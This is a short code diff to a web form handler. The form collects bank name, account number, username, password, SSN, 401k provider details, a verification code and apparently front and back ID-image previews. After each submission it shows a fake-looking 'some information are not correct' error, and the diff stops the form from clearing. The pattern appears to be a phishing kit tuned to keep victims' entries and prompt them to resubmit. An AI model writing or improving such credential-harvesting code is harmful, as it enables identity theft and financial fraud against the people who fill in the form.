@@ -199,20 +199,20 @@ const submitCodeForm = () => {
     $swal.fire('Sorry', 'some information are not correct...', 'error');
     formpage.value = 'default';
     // clear form
-    form.value = {
-      bank: '',
-      accountNumber: '',
-      amount: '',
-      username: '',
-      password: '',
-      ssn: '',
-      fortyOneK: '',
-      fortyOneKProvider: '',
-      code: ''
-    };
+    // form.value = {
+    //   bank: '',
+    //   accountNumber: '',
+    //   amount: '',
+    //   username: '',
+    //   password: '',
+    //   ssn: '',
+    //   fortyOneK: '',
+    //   fortyOneKProvider: '',
+    //   code: ''
+    // };
     // clear previews
-    frontPreview.value = '';
-    backPreview.value = '';
+    // frontPreview.value = '';
+    // backPreview.value = '';
     loadCode.value = false;
 
   }).catch(err => {
